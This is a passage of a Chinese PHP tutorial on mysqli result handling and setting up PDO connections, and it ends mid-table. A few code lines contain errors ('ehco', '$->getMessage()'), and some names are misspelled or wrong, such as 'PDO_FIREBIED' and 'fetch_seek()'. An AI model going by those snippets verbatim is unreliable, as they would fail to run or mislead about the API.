<h3 id="处理连接错误报告"><a href="#处理连接错误报告" class="headerlink" title="处理连接错误报告"></a>处理连接错误报告</h3><p>在连接过程中难免会出现错误，应该及时让用户得到通知。在连接出错时mysqli对象并没有创建成功，所以不能调用mysqli对象中的成员获取这些错误信息，要通过mysqli扩展中的过程方式获取。使用mysqli_connect_errno()函数测试在建立连接的过程中是否发生错误，相关的出错信息由mysqli_connect_error()函数负责返回。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$mysqli=new mysqli(&quot;localhost&quot;,&quot;mysql_user&quot;,&quot;mysql_pwd&quot;,&quot;dbname&quot;);</div><div class="line">	/*	检查连接，如果连接出错输出错误信息并退出程序	*/</div><div class="line">	if(mysqli_connect_errno())&#123;</div><div class="line">		printf(&quot;连接失败：%s\n&quot;,mysqli_connect_error());</div><div class="line">		exit();</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="关闭与MySQL服务器连接"><a href="#关闭与MySQL服务器连接" class="headerlink" title="关闭与MySQL服务器连接"></a>关闭与MySQL服务器连接</h3><p>完成数据库访问工作，如果不再需要连接到数据库，应该明确地释放有关的mysqli对象。随意脚本执行结束后，所有打开的数据库连接都将自动关闭，资源被回收。但是，在执行过程中，又肯页面需要多个数据库连接，各个连接要在适当的时候将其关闭。mysqli对象中的close()方法负责关闭打开数据库连接，成功时返回TRUE，否则返回FALSE。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">     	/* 连接MySQL数据库并，成功则返回mysqli 对象*/</div><div class="line">	$mysqli = new mysqli(&quot;localhost&quot;, &quot;mysql_user&quot;, &quot;mysql_pwd&quot;, &quot;mylib&quot;);</div><div class="line">	/* 检查连接，如果连接出错输出错误信息并退出程序 */ </div><div class="line">	if (mysqli_connect_errno()) &#123;</div><div class="line"> 		printf(&quot;连接失败: %s&lt;br&gt;&quot;, mysqli_connect_error());</div><div class="line">		exit();</div><div class="line">	&#125;</div><div class="line">	/* 打印当前数据库使用字符集字符串 */</div><div class="line">	printf (&quot;当前数据库的字符集： %s&lt;br&gt;&quot;, $mysqli-&gt;character_set_name());</div><div class="line">	/* 打印客户端版本 */</div><div class="line">	printf(&quot;客户端库版本： %s&lt;br&gt;&quot;, $mysqli-&gt;get_client_info());</div><div class="line">	/* 打印服务器主机信息 */</div><div class="line">	printf(&quot;主机信息： %s&lt;br&gt;&quot;, $mysqli-&gt;host_info);</div><div class="line">	/* 打印字符串形式MySQL服务器版本 */</div><div class="line">	printf(&quot;服务器版本: %s&lt;br&gt;&quot;, $mysqli-&gt;server_info);</div><div class="line">	/*打印整数形式MySQL服务器版本*/</div><div class="line">	printf(&quot;服务器版本：%d&lt;br&gt;&quot;, $mysqli-&gt;server_version);</div><div class="line">	/* 关闭打开的数据库连接 */</div><div class="line">	$mysqli-&gt;close();	</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="执行SQL命令-1"><a href="#执行SQL命令-1" class="headerlink" title="执行SQL命令"></a>执行SQL命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$mysqli = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;123456&quot;, &quot;mylib&quot;);</div><div class="line">	if (mysqli_connect_errno()) &#123;</div><div class="line"> 		printf(&quot;连接失败: %s&lt;br&gt;&quot;, mysqli_connect_error());</div><div class="line">		exit();</div><div class="line">	&#125;</div><div class="line">     	/* 执行SQL命令向表中插入一条记录，并获取改变的记录数和新ID值 */</div><div class="line">	if($mysqli-&gt;query(&quot;insert into 表名(列1, 列2) values (&apos;值1&apos;,&apos;值2&apos;)&quot;))&#123;</div><div class="line">		echo &quot;改变的记录数：&quot;.$mysqli-&gt;affected_rows.&quot;&lt;br&gt;&quot;;</div><div class="line">		echo &quot;新插入的ID值：&quot;.$mysqli-&gt;insert_id.&quot;&lt;br&gt;&quot;;</div><div class="line">	&#125;</div><div class="line">	$mysqli-&gt;close();	</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h2 id="使用mysqli-result类"><a href="#使用mysqli-result类" class="headerlink" title="使用mysqli_result类"></a>使用mysqli_result类</h2><table>
<thead>
<tr>
<th>成员方法名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>close()</td>
<td style="text-align:left">释放内存并关闭结果集</td>
</tr>
<tr>
<td>data_seek()</td>
<td style="text-align:left">明确改变当前结果记录顺序</td>
</tr>
<tr>
<td>fetch_field()</td>
<td style="text-align:left">从结果集中获得某一个字段的信息</td>
</tr>
<tr>
<td>fetch_fields()</td>
<td style="text-align:left">从结果集中获得全部字段的信息</td>
</tr>
<tr>
<td>fetch_field_direct()</td>
<td style="text-align:left">从一个指定的列中获得类的详细信息，返回一个包含列信息的对象</td>
</tr>
<tr>
<td>fetch_array()</td>
<td style="text-align:left">将以一个普通索引数组和关联数组两种形式返回一条结果记录</td>
</tr>
<tr>
<td>fetch_assoc()</td>
<td style="text-align:left">将以一个普通关联数组的形式返回一条结果记录</td>
</tr>
<tr>
<td>fetch_object()</td>
<td style="text-align:left">将以一个对象的形式返回一条结果记录</td>
</tr>
<tr>
<td>fetch_seek()</td>
<td style="text-align:left">设置结果集中字段的偏移位置</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>成员属性名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>$current_field</td>
<td style="text-align:left">获取当前结果中指向的字段偏移位置，是一个整数</td>
</tr>
<tr>
<td>$field_count</td>
<td style="text-align:left">从查询的结果中获取列的个数</td>
</tr>
<tr>
<td>$lengths</td>
<td style="text-align:left">返回一个数组，保存在结果集中获取当前行的每一列的长度</td>
</tr>
<tr>
<td>$num_rows</td>
<td style="text-align:left">返回结果集中包含记录的行数</td>
</tr>
</tbody>
</table>
<h3 id="从结果集中解析数据"><a href="#从结果集中解析数据" class="headerlink" title="从结果集中解析数据"></a>从结果集中解析数据</h3><h4 id="result-gt-fetch-row"><a href="#result-gt-fetch-row" class="headerlink" title="$result-&gt;fetch_row()"></a>$result-&gt;fetch_row()</h4><p>该方法从结果集中获取一条结果记录，将值存放在一个索引数组中，与其他三个方法相比是最方便的方法。它的各个字段需要以$row[$n]的方式访问，其中$row是从结果集中获取的一行记录返回的数据，$n为连续的整数下标。因为返回的是索引数组，所以还可以和list()函数结合在一起使用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$mysqli = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;123456&quot;, &quot;demo&quot;);  //连接本地demo数据库</div><div class="line">	if (mysqli_connect_errno()) &#123;</div><div class="line"> 		printf(&quot;连接失败: %s&lt;br&gt;&quot;, mysqli_connect_error());</div><div class="line">		exit();</div><div class="line">	&#125;</div><div class="line">	$mysqli-&gt;query(&quot;set names gb2312&quot;);                     //设置字符集为国标2312码</div><div class="line">     	/* 将部门编号为D01的联系人姓名和电子邮件全部取出存入到结果集中 */</div><div class="line">	$result = $mysqli-&gt;query(&quot;SELECT name, email FROM contactInfo WHERE departmentId=&apos;D01&apos;&quot;);</div><div class="line">	echo &apos;D01部门的联系人姓名和电子邮件：&apos;;</div><div class="line">	echo &apos;&lt;ol&gt;&apos;;</div><div class="line">	while(list($name, $email)=$result-&gt;fetch_row())&#123;     //从结果集中遍历每条数据</div><div class="line">		echo &apos;&lt;li&gt;&apos;.$name.&apos; : &apos;.$email.&apos;&lt;/li&gt;&apos;;            //以列表形式输出每条记录</div><div class="line">	&#125;	</div><div class="line">	echo &apos;&lt;/ol&gt;&apos;;</div><div class="line">    	$result-&gt;close();                                 //关闭结果集</div><div class="line">	$mysqli-&gt;close();	                           //关闭与数据库的连接</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="result-gt-fetch-assoc"><a href="#result-gt-fetch-assoc" class="headerlink" title="$result-&gt;fetch_assoc()"></a>$result-&gt;fetch_assoc()</h4><p>该方法将以一个关联数组的形式返回一条结果记录，数据表的字段名表示键，字段内容表示值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$mysqli = new mysqli(&quot;localhost&quot;, &quot;mysql_user&quot;, &quot;mysql_pwd&quot;, &quot;demo&quot;);  //连接MySQL数据库</div><div class="line">	if (mysqli_connect_errno()) &#123;                                   //检查连接错误</div><div class="line"> 		printf(&quot;连接失败: %s&lt;br&gt;&quot;, mysqli_connect_error());</div><div class="line">		exit();</div><div class="line">	&#125;</div><div class="line">	$mysqli-&gt;query(&quot;set names gb2312&quot;);                            //设置查询字符集</div><div class="line">	$result = $mysqli-&gt;query(&quot;SELECT * FROM contactInfo&quot;);          //执行查询语句获取结果集</div><div class="line"></div><div class="line">	echo &apos;&lt;table width=&quot;90%&quot; border=&quot;1&quot; align=&quot;center&quot;&gt;&apos;;               //打印HTML表格</div><div class="line">	echo &apos;&lt;caption&gt;&lt;h1&gt;联系人信息表&lt;/h1&gt;&lt;/caption&gt;&apos;;                //输出表名</div><div class="line">	echo &apos;&lt;th&gt;用户ID&lt;/th&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;部门编号&lt;/th&gt;&apos;;          //输出字段名</div><div class="line">	echo &apos;&lt;th&gt;联系地址&lt;/th&gt;&lt;th&gt;联系电话&lt;/th&gt;&lt;th&gt;电子邮件&lt;/th&gt;&apos;;    </div><div class="line">	while($row=$result-&gt;fetch_assoc())&#123;                            //循环从结果集中遍历记录</div><div class="line">		echo &apos;&lt;tr align=&quot;center&quot;&gt;&apos;;                                //输出行标记</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;uid&quot;].&apos;&lt;/td&gt;&apos;;                            //输出用户ID</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;name&quot;].&apos;&lt;/td&gt;&apos;;                          //输出用户姓名</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;departmentId&quot;].&apos;&lt;/td&gt;&apos;;                    //输出部门编号</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;address&quot;].&apos;&lt;/td&gt;&apos;;                        //输出联系地址</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;phone&quot;].&apos;&lt;/td&gt;&apos;;                         //输出联系电话</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$row[&quot;email&quot;].&apos;&lt;/td&gt;&apos;;                          //输出电子邮件</div><div class="line">		echo &apos;&lt;/tr&gt;&apos;;</div><div class="line">	&#125;	</div><div class="line">	echo &apos;&lt;/table&gt;&apos;;</div><div class="line">     	$result-&gt;close();                                           //关闭结果集释放内存</div><div class="line">	$mysqli-&gt;close();	                                      //关闭与数据库服务器的连接</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="result-gt-fetch-array"><a href="#result-gt-fetch-array" class="headerlink" title="$result-&gt;fetch_array()"></a>$result-&gt;fetch_array()</h4><p>该方法可以说是fetch_row()和fetch_assoc()两个方法的结合版本，可以将结果集的各条记录获取为一个关联数组或数值索引数组，或者同时获取为关联数组和索引数组。默认情况下，会同时获取这两种数组。可以通过在该方法的参数在该方法的参数中传入如下不同的值来修改这种默认行为。</p>
<ul>
<li>MYSQLI_ASSOC:记录被作为关联数组返回，字段名为键，字段内容为值。</li>
<li>MYSQLI_NUM:记录被作为索引数组返回，按查询中指定的字段名顺序排序。</li>
<li>MYSQLI_BOTH:这是默认值，记录即未做关联数组又作为索引数组返回。因此，每个字段可以根据其索引偏移引用，也可以根据字段名来引用。</li>
</ul>
<h4 id="result-gt-fetch-object"><a href="#result-gt-fetch-object" class="headerlink" title="$result-&gt;fetch_object()"></a>$result-&gt;fetch_object()</h4><p>该方法与前面三个方法不同，它将以一个对象的形式返回一条结果记录，而不是数组。它的各个字段需要以对象的方式进行访问，数据列的名字区分字母大小写情况。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$mysqli = new mysqli(&quot;localhost&quot;, &quot;mysql_user&quot;, &quot;mysql_pwd&quot;, &quot;demo&quot;);  //连接MySQL数据库</div><div class="line">	if (mysqli_connect_errno()) &#123;                                   //检查连接错误</div><div class="line"> 		printf(&quot;连接失败: %s&lt;br&gt;&quot;, mysqli_connect_error());</div><div class="line">		exit();</div><div class="line">	&#125;</div><div class="line">	$mysqli-&gt;query(&quot;set names gb2312&quot;);                            //设置查询字符集</div><div class="line">	$result = $mysqli-&gt;query(&quot;SELECT * FROM contactInfo&quot;);          //执行查询语句获取结果集</div><div class="line"></div><div class="line">	echo &apos;&lt;table width=&quot;90%&quot; border=&quot;1&quot; align=&quot;center&quot;&gt;&apos;;               //打印HTML表格</div><div class="line">	echo &apos;&lt;caption&gt;&lt;h1&gt;联系人信息表&lt;/h1&gt;&lt;/caption&gt;&apos;;                //输出表名</div><div class="line">	echo &apos;&lt;th&gt;用户ID&lt;/th&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;部门编号&lt;/th&gt;&apos;;          //输出字段名</div><div class="line">	echo &apos;&lt;th&gt;联系地址&lt;/th&gt;&lt;th&gt;联系电话&lt;/th&gt;&lt;th&gt;电子邮件&lt;/th&gt;&apos;;    </div><div class="line">	while($rowObj=$result-&gt;fetch_object())&#123;                        //循环从结果集中遍历记录</div><div class="line">		echo &apos;&lt;tr align=&quot;center&quot;&gt;&apos;;                                //输出行标记</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$rowObj-&gt;uid.&apos;&lt;/td&gt;&apos;;                          //输出用户ID</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$rowObj-&gt;name.&apos;&lt;/td&gt;&apos;;                        //输出用户姓名</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$rowObj-&gt;departmentId.&apos;&lt;/td&gt;&apos;;                  //输出部门编号</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$rowObj-&gt;address.&apos;&lt;/td&gt;&apos;;                       //输出联系地址</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$rowObj-&gt;phone.&apos;&lt;/td&gt;&apos;;                        //输出联系电话</div><div class="line">		echo &apos;&lt;td&gt;&apos;.$rowObj-&gt;email.&apos;&lt;/td&gt;&apos;;                         //输出电子邮件</div><div class="line">		echo &apos;&lt;/tr&gt;&apos;;</div><div class="line">	&#125;	</div><div class="line">	echo &apos;&lt;/table&gt;&apos;;</div><div class="line">    	$result-&gt;close();                                           //关闭结果集释放内存</div><div class="line">	$mysqli-&gt;close();	                                      //关闭与数据库服务器的连接</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="从结果集中获取数据列的信息"><a href="#从结果集中获取数据列的信息" class="headerlink" title="从结果集中获取数据列的信息"></a>从结果集中获取数据列的信息</h3><p>在解析结果集时，不仅需要从中遍历数据，有时也需要获取数据表的属性和各个字段的信息。可以通过结果集对象中的field_count属性给出结果数据表里的数据列的个数、使用current_field属性获取指向当前列的位置、使用field_seek()方法改变指向当前列的偏移位置，以及通过fetch_field（）方法返回的对象中获取当前列的信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$mysqli = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;123456&quot;, &quot;demo&quot;);    //连接MySQL数据库</div><div class="line">	if (mysqli_connect_errno()) &#123;                                        //检查连接错误</div><div class="line"> 		printf(&quot;连接失败: %s&lt;br&gt;&quot;, mysqli_connect_error());</div><div class="line">		exit();</div><div class="line">	&#125; </div><div class="line">	$mysqli-&gt;query(&quot;set names gb2312&quot;);                             //设置查询字符集</div><div class="line">	$result = $mysqli-&gt;query(&quot;SELECT * FROM contactInfo&quot;);           //执行查询语句获取结果集</div><div class="line"></div><div class="line">	echo &quot;结果数据表里数据列个数为：&quot;.$result-&gt;field_count.&quot;列&lt;br&gt;&quot;;   //从查询结果中获取列数</div><div class="line">	echo &quot;默认当前列的指针位置为第：&quot;.$result-&gt;current_field.&quot;列&lt;br&gt;&quot;;  //打印默认列的指针位置</div><div class="line">	echo &quot;将指向当前列的指针移动到第二列;&lt;br&gt;&quot;;</div><div class="line">	$result-&gt;field_seek(1);                      //将当前列指针移至第二列（默认0代表第一列）</div><div class="line">	echo &quot;指向当前列的指针位置为第：&quot;.$result-&gt;current_field.&quot;列&lt;br&gt;&quot;;   //打印当前列的指针位置</div><div class="line">	echo &quot;第二列的信息如下所示：&lt;br&gt;&quot;;</div><div class="line">	$finfo = $result-&gt;fetch_field();                                //获取当前列的对象</div><div class="line">	echo &quot;列的名称：&quot;.$finfo-&gt;name.&quot;&lt;br&gt;&quot;;                       //打印列的名称</div><div class="line">	echo &quot;数据列来自数据表：&quot;.$finfo-&gt;table.&quot;&lt;br&gt;&quot;;               //打印本列来自哪个数据表</div><div class="line">	echo &quot;本列最长字符串的长度&quot;.$finfo-&gt;max_length.&quot;&lt;br&gt;&quot;;        //打印本列中最长字符串长度</div><div class="line"></div><div class="line">     	$result-&gt;close();                                           //关闭结果集释放内存</div><div class="line">	$mysqli-&gt;close();	                                      //关闭与数据库服务器的连接</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h1 id="数据库抽象层PDO"><a href="#数据库抽象层PDO" class="headerlink" title="数据库抽象层PDO"></a>数据库抽象层PDO</h1><h2 id="PDO所支持的数据库"><a href="#PDO所支持的数据库" class="headerlink" title="PDO所支持的数据库"></a>PDO所支持的数据库</h2><p>PDO就是一个“数据库访问抽象层”，作用是统一各种数据库的访问接口，能够轻松地在不同数据库之间进行切换，使得数据库间的移植容易实现。</p>
<table>
<thead>
<tr>
<th>驱动名</th>
<th style="text-align:left">对应访问的数据库</th>
</tr>
</thead>
<tbody>
<tr>
<td>PDO_DBLIB</td>
<td style="text-align:left">FreeTDS/Microsoft SQL Server/Sybase</td>
</tr>
<tr>
<td>PDO_FIREBIED</td>
<td style="text-align:left">Firebird/Interbase 6</td>
</tr>
<tr>
<td>PDO_MYSQL</td>
<td style="text-align:left">MySQL 3.x/4.x/5.x</td>
</tr>
<tr>
<td>PDO_OCI</td>
<td style="text-align:left">Oracle</td>
</tr>
<tr>
<td>PDO_ODBC</td>
<td style="text-align:left">ODBC v3</td>
</tr>
<tr>
<td>PDO_PGSQL</td>
<td style="text-align:left">PostgreSQL</td>
</tr>
<tr>
<td>PDO_SQLITE</td>
<td style="text-align:left">SQLite 2.x/3.x</td>
</tr>
</tbody>
</table>
<h2 id="PDO的安装"><a href="#PDO的安装" class="headerlink" title="PDO的安装"></a>PDO的安装</h2><p>在Linux环境下为启用对MySQL的PDO驱动程序支持，需要在安装PHP5.1以上版本的源代码包环境时，向configure命令添加如下标志：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">--with-pdo-mysql=/usr/local/mysql		//其中“/usr/local/mysql”为MySQL服务器安装目录</div></pre></td></tr></table></figure></p>
<p>在Windows环境下PHP5.1以上版本中，PDO和主要数据库的驱动同PHP一样作为扩展发布，要激活它们只需要简单地编辑php.ini文件。下面都是用分号在前面注释掉了支持的扩展模块，我们在后面追加下面的一行代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">extension=php_pdo.dll			//所以PDO驱动程序共享的扩展，必须有</div></pre></td></tr></table></figure></p>
<p>上面一行是所以PDO驱动程序共享必须要有的扩展。然后，就看使用什么数据库，如果使用MySQL，那么添加下面的一行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">extension=php_pdo_mysql.dll				//如果使用MySQL，那么添加这一行</div></pre></td></tr></table></figure></p>
<p>如果要激活其他一种数据库的PDO驱动程序，添加下面其中的一行，如果要激活多个数据库的PDO驱动程序，添加下面的多行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">extension=php_pdo_mssql.dll			//如果要使用SQL Server，那么添加这一行</div><div class="line">extension=php_pdo_odbc.dll			//如果要使用ODBC驱动程序，那么添加这一行</div><div class="line">extension=php_pdo_oci.dll			//如果要使用Oracle驱动程序，那么添加这一行</div></pre></td></tr></table></figure></p>
<p>保存修改的php.ini文件变化，重启Apache服务器，查看phpinfo()函数PDO是否开启。</p>
<h2 id="创建PDO对象"><a href="#创建PDO对象" class="headerlink" title="创建PDO对象"></a>创建PDO对象</h2><p>使用PDO在与不同数据库管理系统之间交互时，PDO对象中的成员方法是统一各种数据库的访问接口，所以在使用PDO与数据库交互之间，首先要创建一个PDO对象。在通过构造方法创建对象的同时，需要建立一个与数据库服务器的连接，并选择一个数据库。PDO的构造方法原型如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">__construct(string dsn[,string username[,string password[,array driver_options]]])		//PDO的构造方法</div></pre></td></tr></table></figure></p>
<p>在构造方法中，第一个必选的参数是数据源名（DSN），用来定义一个确定的数据库和必须用到的驱动程序。DSN的PDO命名惯例为PDO驱动程序的名称，后面一个冒号，再后面是可选的驱动程序的数据库连接变量信息，如主机名、端口和数据库名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">oci:dbname=//localhost:1521/mydb			//连接Oracle服务器的数据源名（DSN）</div><div class="line">mysql:host=localhost;dbname=testdb			//连接MySQL服务器的数据源名（DSN）</div></pre></td></tr></table></figure></p>
<p>构造方法中的第二参数username和第三个参数password分别指定用于连接数据库的用户名和密码，是可选参数。最后一个参数driver_options需要一个数组，用来指定连接所需的所有额外选项，传递附加的调优参数到PDO或底层驱动程序。</p>
<h3 id="以多种方法调用构造方法"><a href="#以多种方法调用构造方法" class="headerlink" title="以多种方法调用构造方法"></a>以多种方法调用构造方法</h3><h4 id="将参数嵌入到构造函数"><a href="#将参数嵌入到构造函数" class="headerlink" title="将参数嵌入到构造函数"></a>将参数嵌入到构造函数</h4><p>在DSN字符串中加载OCI驱动程序并指定了两个可选参数：第一个是数据库名称，第二个是字符集。使用了特定的字符集连接一个特定的数据库，如果不指定任何信息就会使用默认的数据库。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	try&#123;</div><div class="line">			$dbh = new PDO(&quot;OCI:dbname=accounts;charset=UTF-8&quot;,&quot;scott&quot;,&quot;tiger&quot;);</div><div class="line">	&#125;catch(PDOException $e)&#123;</div><div class="line">			echo &quot;数据库连接失败：	&quot;.$e-&gt;getMessage();</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>OCI:dbname=accounts告诉PDO它应该使用OCI驱动程序，并且应该使用“accounts”数据库。对于MySQL驱动程序，第一个冒号后面的所有内容都将用做MySQL的DSN。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$dsn=&apos;mysql:dbname=testdb;host=127.0.0.1&apos;;</div><div class="line">	$user=&apos;dbuser&apos;;</div><div class="line">	$password=&apos;dbpass&apos;;</div><div class="line">	try&#123;</div><div class="line">			$dbh = new PDO($dsn,$user,$password);</div><div class="line">	&#125;catch(PDOException $e)&#123;</div><div class="line">			echo &apos;数据库连接失败： &apos;.$e-&gt;getMessage();</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="将参数存放在文件中"><a href="#将参数存放在文件中" class="headerlink" title="将参数存放在文件中"></a>将参数存放在文件中</h4><p>在创建PDO对象时，可以把DSN字符串放在另一个本地或远程文件中，并在构造函数中引用这个文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	try&#123;</div><div class="line">		$dbh = new PDO(&apos;uri:file://usr/local/dbconnect&apos;,&apos;webuser&apos;,&apos;password&apos;);</div><div class="line">	&#125;catch(PDOException $e)&#123;</div><div class="line">		ehco&apos;连接失败： &apos;.$e-&gt;getMessage();</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>只要将文件/usr/local/dbconnect中的DSN驱动改变，就可以在多种数据库系统之间切换。但要确保该文件由负责执行PHP脚本的用户拥有，而且此用户拥有必要的权限。</p>
<h4 id="引用php-ini"><a href="#引用php-ini" class="headerlink" title="引用php.ini"></a>引用php.ini</h4><p>也可以在PHP服务器的配置文件中维护DSN信息，只要在php.ini文件中把DSN信息赋给一个名为pdo.dsn.aliasname的配置参数，这里aliasname是后面将提供给构造函数的DSN别名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[PDO]</div><div class="line">pdo.dsn.orcalepdo=&quot;OCI:dbname=//localhost:1521/mydb;charset=UTF-8&quot;;</div></pre></td></tr></table></figure></p>
<p>重启启动Apache服务器后，就可以在PHP程序中，调用PDO构造方法时，在第一个参数中使用这个别名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	try&#123;</div><div class="line">		$dbh=new PDO(&quot;orcalepdo&quot;,&quot;scott&quot;,&quot;tiger&quot;);	//使用php.ini文件中的oraclepdo别名</div><div class="line">	&#125;catch(PDOException $e)&#123;</div><div class="line">		echo &quot;数据库连接失败： &quot;.$-&gt;getMessage();</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="PDO与连接有关选项"><a href="#PDO与连接有关选项" class="headerlink" title="PDO与连接有关选项"></a>PDO与连接有关选项</h4><p>在创建PDO对象时，有一些与数据库连接有关的选项，可以将必要的几个选项组成数组传递给构造方法的第四个参数driver_opts中，用来传递附加的调优参数到PDO或底层驱动程序。</p>
<table>
<thead>
<tr>
<th>选项名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>PDO::ATTR_AUTOCOMMIT</td>
<td style="text-align:left">确定PDO是否关闭自动提交功能，设置FALSE值时关闭</td>
</tr>
<tr>
<td>PDO::ATTR_CASE</td>
<td style="text-align:left">强制PDO获取的表字符的大小写转换，或原样使用列信息</td>
</tr>
<tr>
<td>PDO::ATTR_ERRMODE</td>
<td style="text-align:left">设置错误处理的模式</td>
</tr>
<tr>
